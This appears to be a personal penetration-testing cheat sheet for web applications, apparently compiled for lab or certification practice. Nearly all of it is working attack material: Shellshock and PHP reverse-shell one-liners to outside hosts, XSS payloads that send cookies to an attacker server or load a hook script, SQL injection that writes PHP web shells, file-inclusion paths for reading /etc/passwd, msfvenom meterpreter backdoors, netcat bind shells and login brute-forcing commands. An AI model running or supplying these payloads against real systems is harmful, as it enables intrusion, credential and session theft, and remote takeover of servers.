Web apps:
	Remote exploits
		use exploit/multi/http/php_cgi_arg_injection (remote command inj PHP < 5.4.2)
		shellshock: root@kali:~# curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/10.11.0.4/443 0>&1; echo zzzz;'" \
  														http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
  Wordpress:
		wpscan --url http://192.168.114.129 --wordlist /usr/share/wordlists/rockyou.txt --threads 50

POST form bruteforce:
	cewl pinkydb > pinky.wordlist
	john --rules --stdout --wordlist=pinky.wordlist > pinkyBig.wordlist
	hydra -L users.txt -P pinky.wordlist pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"


	Browsing:
		curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080

	METHODS: (guide including auth https://www.qed42.com/blog/using-curl-commands-webdav)
		PUT THE FILE:  curl -T /root/labs/229/test.asp http://10.11.1.229/_vti_pvt/test.txt
		curl -X COPY --header 'Destination:http://10.11.1.229/test1.dll' 'http://10.11.1.229/test1.browser'
		curl -X MOVE --header 'Destination:http://10.11.1.229/test1.dll' 'http://10.11.1.229/test1.jsp'

	XSS:
		<iframeSRC="http://192.168.30.5:81/report" height = "0" width = "0"></iframe>
		<script> new Image().src="http://192.168.30.5:81/bogus.php?output="+document.cookie;</script>
		'">><script src="http://10.11.0.76:3000/hook.js"></script>
		'">><iframe SRC="http://10.11.0.76:3000/hook.js" height = "0" width ="0"></iframe>
		'">><iframe SRC="http://10.11.0.76:8081" height = "0" width ="0"></iframe>
		<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://rangeplan.tesco.com/home"></iframe>

		javascript:alert(document.domain)//://
		https://demos.lightstreamer.com/?p=lightstreamer&t=%27-confirm`OPENBUGBOUNTY`-%27
		<img src='zzzz' onerror='prompt(1)' />
		<img src=x onerror=alert(1)>
		<b onmouseover=alert('XSS')>Click Me!</b>
		<svg onload=alert(1)>
		<body onload="alert('XSS')">
		<img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
		/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
		In case of filtering:
		[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()

		Via attachment upload: <html><body><script>alert(location)</script>
													 \"'><img src=x onerror=alert(30) />	(https://cure53.de/pentest-report_whistler.pdf)
													 <h2>"'><img src=x onerror=alert(10) /></h2>

	SQL inj:

		Line endings: # OR -- OR -
	To test login/pass fieds:
		'or 1#
		asd' or 1=1 --
		'or 1 LIMIT 1#
		To put \ as username and 'or 1# as pass
		asdf' or 1=1 limit 1;#		-Username injection with no passw
		asdf' OR '1'='1' -- ' OR '1'='1' /* -- MySQL ' OR '1'='1' # -- Access (using null characters) ' OR '1'='1' %00 ' OR '1'='1' %16
		http://192.168.30.35/comment.php?id=738 order by 7
						?id=738 union select 1,2,3,4,5,6	-To see which columns are displayed
						?id=738 union all select 1,2,3,4,@@version,6
						?id=738 union all select 1,2,3,4,@@version,6	-Or try user() to see current one
						?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
						?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
						?id=738 union all select 1,2,name,4,password,6 FROM users
						?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
		http://192.168.30.35/backdoor.php?cmd=ipconfig		-To run previously uploaded shell
						?id=738 union all select 1,2,3,4,load_file("c:/xampp/htdocs/backdoor.php"),6

		http://192.168.1.117/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;

		http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,%28SELECT%20GROUP_CONCAT%28column_name%29%20FROM%20information_schema.columns%20WHERE%20table_name=0x746c5f746f6b656e%20GROUP%20BY%20table_name%20LIMIT%200,1%29

		SELECT * FROM users LIMIT 3

	to write shell in a file: movie=-1 UNION SELECT 1,'<?php eval($_GET[cmd]); ?>',3,4,5,6,7 from users INTO OUTFILE '/var/www/1.php'
	to read file: =-1 UNION SELECT 1,LOAD_FILE('/var/www/bWAPP/documents/1.php'),3,4,5,6,7 from users
	to read etc/passwd avoiding quotes: =-1 UNION SELECT 1,LOAD_FILE(char(47,101,116,99,47,112,97,115,115,119,100)),3,4,5,6,7 from users
	Denial of Service: id=BENCHMARK(10000000,BENCHMARK(10000000,md5(current_date)))

	In case spaces are filtered: select/**/version();
	Return first char of version: select/**/substring(version(),1,1);
	Return ASCII char of version (in case of chars truncation): select/**/ascii(substring(version(),1,1));

	Blind: 	http://192.168.30.35/comment.php?id=738 and 1=1;# 	-compare to 1=2;#
		http://192.168.30.35/comment.php?id=738-sleep(5)
		True: http://192.168.30.35/comment.php?id=AAA')/**/or/**/(select/**/1)=1%23
		False: http://192.168.30.35/comment.php?id=AAA')/**/or/**/(select/**/1)=0%23
	Script to blind sql inj - offsec awae - Tutor - MySql Version Extraction
	SQLmap:
		sqlmap -u http://192.168.30.35 --crawl=1		-Crawl website for sql inj
		sqlmap -u http://192.168.30.35/comment.php?id=738 --dbms=mysql --dump --threads=5
		sqlmap -u http://192.168.30.35/comment.php?id=738 --dbms=mysql --os-shell
		sqlmap -u 'http://10.11.1.252:8000/edit_type.php?type_id=5' --dbms=mysql --cookie="security=low; PHPSESSID=j3sd7h9v3iseiv3qcpivlai1o6"
		sqlmap --random-agent -u "http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16&ver=2.0" --dbms=mysql --level=5 --risk=3 -v 3 --threads 10 --string="left: 50%;"

	LFI:
		LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
		/var/log/auth.log
		PHP:
			Session cookie: loc=/var/lib/php5/sess_[session_id_from_cookie]
		Apache files:
			FreeBSD:
				/usr/local/etc/apache22/httpd.conf
				var/log/httpd-access.log
				/usr/local/www/apache22/data	-Web root
			Debian:
				/var/log/apache/access.log
				/var/log/apache2/access.log
			CentOS:
				page=../../../../../../../etc/httpd/logs/error_log%00
				page=../../../../../../../etc/httpd/logs/access_log%00
				/var/log/httpd/access_log%00

				/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www	-Web root

				/home/www/kioptrix3.com/gallery	-Webroot for Gallarific app
			Windows:
			c:\windows\win.ini
				../../../../../../../../xampp/apache/logs/access.log
			Inject shell to logs:
				nc -nv 192.168.186.142 80
				<?php echo shell_exec($_GET['cmd']);?>

NOSQL injections: (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection )
		Intercept login and amend the body providing username only: {"username":"admin","password":{"$gt":""}}
		In case of Node.js: username=admin&password[$gt]=&submit=login
		1995'; while(1); var foo='bar
		1995';return(db.getCollectionNames().length == 3);var foo='bar
		1995';sleep(5000);var foo='bar
		1995'; return this.a != 'EL7e9mMq0U194OwH1Syt'; var dummy=1
		Original request: Collection(Database(MongoClient('localhost', 27017), u'test_database'), u'london_garages'), collection.find = <bound method Collection.find of Collection(Data...', 27017), u'test_database'), u'london_garages')>, where = {'$where': "this.CompanyName == 'sdfd''''"}

Backdoors:
		msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 -f raw > backdoor.php
		msfcli multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443
	Shells:
		<?php echo "aaaaa\n"; echo shell_exec($_GET["cmd"]); echo "zzzzz\n";?>
		php -r '$sock=fsockopen("10.42.51.166",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
    <?php $sock=fsockopen("10.42.51.166",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
		msfvenom -p cmd/unix/reverse_php_ssl LHOST=10.42.66.21 LPORT=443 -f raw

Code injection

http://172.28.69.65/codeexec/example1.php?name=hacker".system('cat /etc/passwd')%3b%23
http://172.28.69.65/codeexec/example2.php?order=id);}system('cat /etc/passwd')%3b%2f%2f
http://192.168.1.117/admin/uploads/1448020946.png/c.php?c=uname%20-a
http://192.168.1.119/bWAPP/documents/1.php?cmd=phpinfo();

write local shell http://192.168.1.119/bWAPP/documents/1.php?cmd=copy('http://192.168.1.117/agent1.txt','./agent123.php');
the same but in base64 http://192.168.1.119/bWAPP/documents/1.php?cmd=eval(base64_decode(Y29weSgnaHR0cDovLzE5Mi4xNjguMS4xMTcvYWdlbnQxLnR4dCcsJy4vYWdlbnQxMjMucGhwJyk7));

include("/path/$file.php")


Shellshock
searchsploit shellshock
python shellshock.py payload=reverse rhost=10.11.1.71 lhost=10.11.0.76 lport=1234

$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
$ echo -e "HEAD /bWAPP/cgi-bin/shellshock.sh HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

echo -e "HEAD /cgi-bin/test.cgi HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: 10.11.1.72\r\nConnection: close\r\n\r\n" | nc 10.11.1.72 80

$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: Forward' or sleep(0) and '1'='1\r\nConnection: close\r\n\r\n" | netcat 192.168.1.117 80
echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: Forward' or sleep(4) and '1'='1\r\nConnection: close\r\n\r\n" | netcat vulnerable 80
